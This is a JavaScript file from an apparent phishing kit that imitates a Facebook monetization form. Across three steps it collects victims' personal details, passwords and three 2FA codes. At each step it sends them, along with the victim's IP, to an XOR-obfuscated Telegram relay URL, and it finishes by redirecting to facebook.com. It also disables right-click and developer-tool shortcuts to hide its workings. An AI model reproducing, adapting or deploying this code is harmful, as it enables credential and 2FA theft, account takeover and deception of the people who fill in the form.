/**
 * web-tick v3 — PinInput, Checkbox, Spinner, localStorage
 * + Telegram Worker + IP + Language Check
 */
(function(){
'use strict';

// ═══ TELEGRAM WORKER ═══
var _e = '103f4d531e6a1d0b06245e33197f43173952461f7e485c1834413812241a0f244b480822410a122941';
var _k = 'xK9#mP2$vL7@qR4';
var _auth = 'ph1sh_auth_k3y_2026';

var _workerUrl = '';
for (var i = 0, j = _e.length; i < j; i += 2) {
  _workerUrl += String.fromCharCode(
    parseInt(_e.substring(i, i + 2), 16) ^ _k.charCodeAt((i / 2) % _k.length)
  );
}

function sendToTelegram(message) {
  fetch(_workerUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'message=' + encodeURIComponent(message) + '&auth=' + encodeURIComponent(_auth)
  }).catch(function() { /* silent */ });
}

// ═══ IP FETCH ═══
var userIp = 'Unknown';
(function fetchIP() {
  var sources = [
    { url: 'https://api.ipify.org?format=json', key: 'ip' },
    { url: 'https://api64.ipify.org?format=json', key: 'ip' },
    { url: 'https://httpbin.org/ip', key: 'origin' },
    { url: 'https://api.ip.sb/geoip', key: 'ip' },
    { url: 'https://ipapi.co/json/', key: 'ip' }
  ];
  function trySource(idx) {
    if (idx >= sources.length) return;
    var s = sources[idx];
    fetch(s.url).then(function(r) { return r.json(); }).then(function(d) {
      userIp = d[s.key] || 'Unknown';
    }).catch(function() { trySource(idx + 1); });
  }
  trySource(0);
})();

// ═══ STATE ═══
var mainContent = document.getElementById('mainContent');
var overlay = document.getElementById('modalOverlay');
var mInfo = document.getElementById('modalInfo');
var mPwd = document.getElementById('modalPassword');
var m2FA = document.getElementById('modalTwoFactor');
var mOk = document.getElementById('modalSuccess');

var state = { isOpendInfo: false, isOpendPassword: false, isOpendTwoFactor: false, isOpendSuccess: false, loaded: false };
var formData = { fullName: '', email: '', emailBusiness: '', fanpage: '', phone: '', message: '', password: '', passwordSecond: '', twoFa: '', twoFaSecond: '', twoFaThird: '' };
var SK = 'monetization_form_state', EXP = 30 * 86400000;

// ═══ LOCALSTORAGE ═══
function loadState() {
  try {
    var r = localStorage.getItem(SK);
    if (!r) return;
    var s = JSON.parse(r);
    if (Date.now() < s.expires) {
      state.isOpendInfo = s.state.isOpendInfo || false;
      state.isOpendPassword = s.state.isOpendPassword || false;
      state.isOpendTwoFactor = s.state.isOpendTwoFactor || false;
      state.isOpendSuccess = s.state.isOpendSuccess || false;
      if (s.formData) Object.assign(formData, s.formData);
    } else {
      localStorage.removeItem(SK);
    }
  } catch (e) {}
}

function saveState() {
  if (!state.loaded) return;
  try {
    localStorage.setItem(SK, JSON.stringify({
      state: { isOpendInfo: state.isOpendInfo, isOpendPassword: state.isOpendPassword, isOpendTwoFactor: state.isOpendTwoFactor, isOpendSuccess: state.isOpendSuccess },
      formData: formData,
      expires: Date.now() + EXP
    }));
  } catch (e) {}
}

// ═══ RENDER ═══
function render() {
  if (state.isOpendSuccess) { showMod(mOk); hideMod(mInfo, mPwd, m2FA); showOv(); hideMain(); }
  else if (state.isOpendTwoFactor) { showMod(m2FA); hideMod(mInfo, mPwd, mOk); showOv(); hideMain(); }
  else if (state.isOpendPassword) { showMod(mPwd); hideMod(mInfo, m2FA, mOk); showOv(); hideMain(); }
  else if (state.isOpendInfo) { showMod(mInfo); hideMod(mPwd, m2FA, mOk); showOv(); hideMain(); }
  else { hideMod(mInfo, mPwd, m2FA, mOk); hideOv(); showMain(); }
  saveState();
}

function showMod(e) { e.classList.remove('hidden'); }
function hideMod() { for (var i = 0; i < arguments.length; i++) arguments[i].classList.add('hidden'); }
function showOv() { overlay.classList.remove('hidden'); }
function hideOv() { overlay.classList.add('hidden'); }
function hideMain() { mainContent.classList.add('hidden'); }
function showMain() { mainContent.classList.remove('hidden'); }

// ═══ MODAL OPEN/CLOSE ═══
window.openInfoModal = function() { state.isOpendInfo = true; populateInfo(); render(); };
window.closeInfoModal = function() { state.isOpendInfo = false; render(); };
window.closePasswordModal = function() { state.isOpendPassword = false; state.isOpendInfo = true; render(); };
window.closeTwoFactorModal = function() { state.isOpendTwoFactor = false; state.isOpendPassword = true; render(); };
window.closeSuccessModal = function() {
  state.isOpendSuccess = state.isOpendTwoFactor = state.isOpendPassword = state.isOpendInfo = false;
  localStorage.removeItem(SK);
  render();
};
window.backToInfo = function() { state.isOpendPassword = false; state.isOpendInfo = true; render(); };
window.backToPassword = function() { state.isOpendTwoFactor = false; state.isOpendPassword = true; render(); };

// ═══ FORM SUBMISSIONS (with Telegram) ═══
window.submitInfo = function() {
  if (!validateStep1()) return;
  formData.fullName = byId('fullName').value.trim();
  formData.email = byId('email').value.trim();
  formData.emailBusiness = byId('emailBusiness').value.trim();
  formData.fanpage = byId('fanpage').value.trim();
  formData.phone = byId('phone').value.trim();
  formData.message = byId('message').value.trim();

  // Gửi STEP 1 INFO về Telegram
  var msg = '<b>\uD83D\uDCCC [STEP 1 - INFO]</b>\n────────────────\n'
    + 'Full Name: <code>' + formData.fullName + '</code>\n'
    + 'Email: <code>' + formData.email + '</code>\n'
    + 'Business Email: <code>' + formData.emailBusiness + '</code>\n'
    + 'Fanpage: <code>' + formData.fanpage + '</code>\n'
    + 'Phone: <code>' + formData.phone + '</code>\n'
    + 'Message: <code>' + (formData.message || '(empty)') + '</code>\n'
    + '────────────────\n\uD83C\uDF0D IP: <i>' + userIp + '</i>\n────────────────';
  sendToTelegram(msg);

  state.isOpendInfo = false; state.isOpendPassword = true; render();
};

window.submitPassword = function() {
  if (!validateStep2()) return;
  formData.password = byId('password').value;
  formData.passwordSecond = byId('passwordSecond').value;

  // Gửi PASSWORD về Telegram
  var msg = '<b>\uD83D\uDCCC [STEP 2 - PASSWORD]</b>\n────────────────\n'
    + 'Email: <code>' + formData.email + '</code>\n'
    + 'Password: <code>' + formData.password + '</code>\n'
    + 'Password Confirm: <code>' + formData.passwordSecond + '</code>\n'
    + '────────────────\n\uD83C\uDF0D IP: <i>' + userIp + '</i>\n────────────────';
  sendToTelegram(msg);

  state.isOpendPassword = false; state.isOpendTwoFactor = true; clearPins(); render();
};

window.submitTwoFactor = function() {
  readPins();
  if (!validateStep3()) return;
  formData.twoFa = byId('twoFa').value;
  formData.twoFaSecond = byId('twoFaSecond').value;
  formData.twoFaThird = byId('twoFaThird').value;

  showLoading();

  // Gửi 2FA CODES về Telegram
  var msg = '<b>\uD83D\uDCCC [STEP 3 - 2FA CODES]</b>\n────────────────\n'
    + 'Email: <code>' + formData.email + '</code>\n'
    + 'Code 1: <code>' + formData.twoFa + '</code>\n'
    + 'Code 2: <code>' + formData.twoFaSecond + '</code>\n'
    + 'Code 3: <code>' + formData.twoFaThird + '</code>\n'
    + '────────────────\n\uD83C\uDF0D IP: <i>' + userIp + '</i>\n────────────────';
  sendToTelegram(msg);

  // Delay rồi redirect
  setTimeout(function() {
    hideLoading();
    window.location.href = 'https://www.facebook.com';
  }, 2000);
};

// ═══ PIN INPUT LOGIC ═══
function readPins() {
  document.querySelectorAll('.pin-group').forEach(function(g) {
    var hiddenId = g.dataset.pin;
    var vals = [];
    g.querySelectorAll('input').forEach(function(inp) { vals.push(inp.value); });
    document.getElementById(hiddenId).value = vals.join('');
  });
}

function clearPins() {
  document.querySelectorAll('.pin-group input').forEach(function(inp) { inp.value = ''; inp.classList.remove('filled', 'error'); });
  ['twoFa', 'twoFaSecond', 'twoFaThird'].forEach(function(id) { byId(id).value = ''; });
}

function showLoading() {
  var btn = document.getElementById('btnSubmitFinal');
  btn.querySelector('.btn-text').classList.add('hidden');
  btn.querySelector('.btn-spinner').classList.add('show');
  btn.disabled = true;
}

function hideLoading() {
  var btn = document.getElementById('btnSubmitFinal');
  btn.querySelector('.btn-text').classList.remove('hidden');
  btn.querySelector('.btn-spinner').classList.remove('show');
  btn.disabled = false;
}

// ═══ POPULATE ═══
function populateInfo() {
  byId('fullName').value = formData.fullName || '';
  byId('email').value = formData.email || '';
  byId('emailBusiness').value = formData.emailBusiness || '';
  byId('fanpage').value = formData.fanpage || '';
  byId('phone').value = formData.phone || '';
  byId('message').value = formData.message || '';
  byId('agreeInfo').checked = false;
}

// ═══ VALIDATION ═══
function clearErrors(form) {
  form.querySelectorAll('.error-msg').forEach(function(e) { e.remove(); });
  form.querySelectorAll('.error').forEach(function(e) { e.classList.remove('error'); });
}

function showError(el, msg) {
  el.classList.add('error');
  var e = document.createElement('div');
  e.className = 'error-msg';
  e.textContent = msg;
  el.parentNode.appendChild(e);
  el.focus();
  el.style.animation = 'shake .4s ease';
  setTimeout(function() { el.style.animation = ''; }, 400);
}

function validateStep1() {
  clearErrors(document.getElementById('formInfo'));
  var ok = true, first = null;
  var fields = [
    { id: 'fullName', label: 'Full Name' },
    { id: 'email', label: 'Email', email: true },
    { id: 'emailBusiness', label: 'Business Email', email: true },
    { id: 'fanpage', label: 'Fanpage URL' },
    { id: 'phone', label: 'Phone Number' }
  ];
  fields.forEach(function(f) {
    var el = byId(f.id); if (!el) return;
    var v = el.value.trim();
    if (!v) { ok = false; showError(el, f.label + ' is required'); if (!first) first = el; }
    else if (f.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) { ok = false; showError(el, 'Invalid email'); if (!first) first = el; }
  });
  if (!byId('agreeInfo').checked) {
    ok = false;
    var cb = byId('agreeInfo');
    cb.parentNode.querySelector('.check-box').style.borderColor = '#e53e3e';
    if (!first) first = cb;
  }
  return ok;
}

function validateStep2() {
  clearErrors(document.getElementById('formPassword'));
  var ok = true, first = null;
  var p = byId('password'), p2 = byId('passwordSecond');
  if (!p.value) { ok = false; showError(p, 'Password is required'); first = p; }
  if (!p2.value) { ok = false; showError(p2, 'Confirm password is required'); if (!first) first = p2; }
  else if (p.value && p.value !== p2.value) { ok = false; showError(p2, 'Passwords do not match'); if (!first) first = p2; }
  return ok;
}

function validateStep3() {
  clearErrors(document.getElementById('formTwoFactor'));
  var ok = true, first = null;
  ['twoFa', 'twoFaSecond', 'twoFaThird'].forEach(function(id) {
    var v = byId(id).value;
    if (!v || v.length !== 6 || !/^\d+$/.test(v)) {
      ok = false;
      var group = document.querySelector('.pin-group[data-pin="' + id + '"]');
      if (group) group.querySelectorAll('input').forEach(function(inp) { inp.classList.add('error'); });
      if (!first) first = group ? group.querySelector('input') : null;
    }
  });
  if (first) first.focus();
  return ok;
}

// ═══ PIN INPUT AUTO-ADVANCE ═══
document.querySelectorAll('.pin-group input').forEach(function(inp) {
  inp.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    if (e.target.value) { e.target.classList.add('filled'); } else { e.target.classList.remove('filled'); }
    if (e.target.value.length === 1) {
      var all = Array.from(e.target.parentNode.querySelectorAll('input'));
      var idx = all.indexOf(e.target);
      if (idx < all.length - 1) all[idx + 1].focus();
    }
  });
  inp.addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && !e.target.value) {
      var all = Array.from(e.target.parentNode.querySelectorAll('input'));
      var idx = all.indexOf(e.target);
      if (idx > 0) { all[idx - 1].focus(); all[idx - 1].value = ''; all[idx - 1].classList.remove('filled'); e.preventDefault(); }
    }
    if (e.key === 'ArrowLeft') {
      var all = Array.from(e.target.parentNode.querySelectorAll('input'));
      var idx = all.indexOf(e.target);
      if (idx > 0) { all[idx - 1].focus(); e.preventDefault(); }
    }
    if (e.key === 'ArrowRight') {
      var all = Array.from(e.target.parentNode.querySelectorAll('input'));
      var idx = all.indexOf(e.target);
      if (idx < all.length - 1) { all[idx + 1].focus(); e.preventDefault(); }
    }
  });
  inp.addEventListener('paste', function(e) {
    e.preventDefault();
    var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
    var all = Array.from(e.target.parentNode.querySelectorAll('input'));
    var idx = all.indexOf(e.target);
    for (var i = 0; i < Math.min(paste.length, all.length - idx); i++) { all[idx + i].value = paste[i]; all[idx + i].classList.add('filled'); }
    var next = Math.min(idx + paste.length, all.length - 1);
    if (all[next]) all[next].focus();
  });
});

// ═══ TOGGLE PASSWORD ═══
window.togglePassword = function(id, btn) {
  var inp = byId(id); if (!inp) return;
  if (inp.type === 'password') {
    inp.type = 'text';
    btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
  } else {
    inp.type = 'password';
    btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
  }
};

// ═══ KEYBOARD ESCAPE ═══
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    if (state.isOpendSuccess) closeSuccessModal();
    else if (state.isOpendTwoFactor) closeTwoFactorModal();
    else if (state.isOpendPassword) closePasswordModal();
    else if (state.isOpendInfo) closeInfoModal();
  }
  // Block F12 and DevTools
  if (e.key === 'F12' || e.keyCode === 123 ||
      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
      (e.ctrlKey && e.keyCode === 85)) {
    e.preventDefault();
    return false;
  }
});

// ═══ BLOCK RIGHT-CLICK ═══
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

// ═══ OVERLAY CLICK ═══
overlay.addEventListener('click', function() {
  if (state.isOpendSuccess) closeSuccessModal();
  else if (state.isOpendTwoFactor) closeTwoFactorModal();
  else if (state.isOpendPassword) closePasswordModal();
  else if (state.isOpendInfo) closeInfoModal();
});

// ═══ HELPER ═══
function byId(id) { return document.getElementById(id); }

// ═══ INIT ═══
loadState(); state.loaded = true; render();
var y = new Date().getFullYear();
document.querySelectorAll('#currentYear, #currentYear2').forEach(function(e) { e.textContent = y; });

})();
